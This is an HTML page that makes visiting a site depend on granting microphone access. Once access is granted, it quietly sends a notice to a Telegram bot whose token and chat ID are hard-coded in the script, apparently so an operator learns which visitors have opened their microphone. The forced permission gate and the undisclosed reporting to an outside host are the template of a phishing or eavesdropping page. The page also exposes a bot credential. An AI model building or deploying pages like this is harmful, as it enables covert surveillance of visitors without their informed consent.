<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microphone Permission</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f3f4f6;
        }
        .container {
            text-align: center;
            padding: 20px;
            background: white;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
        }
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Microphone Access Required</h1>
        <p>To access this site, you need to allow microphone permission.</p>
    </div>

    <script>
        // Request Microphone Permission on Page Load
        async function requestMicrophonePermission() {
            try {
                // Request microphone access
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                alert("Microphone access granted!");

                // Example code for sending data to Telegram
                const chat_id = '5998202830'; // Replace with valid chat ID
                const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your bot token
                const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;

                const message = "User granted microphone access.";
                fetch(telegramURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: message })
                }).then(response => {
                    if (response.ok) {
                        console.log("Message sent to Telegram!");
                    } else {
                        console.error("Failed to send data.");
                    }
                });
            } catch (error) {
                alert("Microphone access denied. You cannot proceed.");
                document.body.innerHTML = `<h1>Access Denied</h1><p>You need to allow microphone access to use this site.</p>`;
            }
        }

        // Call the function on page load
        window.onload = requestMicrophonePermission;
    </script>
</body>
</html>
